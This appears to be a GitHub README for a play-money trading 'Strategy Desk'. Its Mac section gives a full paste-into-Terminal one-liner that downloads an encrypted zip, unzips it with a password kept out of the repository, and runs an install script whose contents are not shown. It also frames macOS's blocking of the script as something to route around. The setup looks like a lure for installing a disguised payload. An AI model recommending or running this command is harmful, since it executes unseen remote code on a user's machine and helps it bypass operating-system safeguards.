# Strategy Desk

Play-money research book. One price tape, one cash account, no live orders.

Version 1.4.0. The user's guide is [public/strategy-desk-guide.pdf](public/strategy-desk-guide.pdf). How the strategies combine is [public/strategy-interplay.pdf](public/strategy-interplay.pdf).

[public/strategy-desk.zip](public/strategy-desk.zip) is the same project in one archive. It is encrypted. The password is not in this repository.

## Mac

Do not double-click a script, and do not run it from Downloads. macOS blocks both. Open **Terminal**, paste this, and press Return. Type the archive password when `unzip` asks for it.

```bash
cd "$HOME" && curl -fsSL -o strategy-desk.zip "https://github.com/JPFava/strategy-desk/raw/main/public/strategy-desk.zip" && unzip strategy-desk.zip && cd strategy-desk && bash install-desk.sh
```

That downloads the desk into your home folder, where Terminal is allowed to run it. It installs Node.js 22 or newer if needed, then opens the desk at `http://127.0.0.1:8080`.

## Windows

Unzip the archive and double-click `install-desk.bat`.
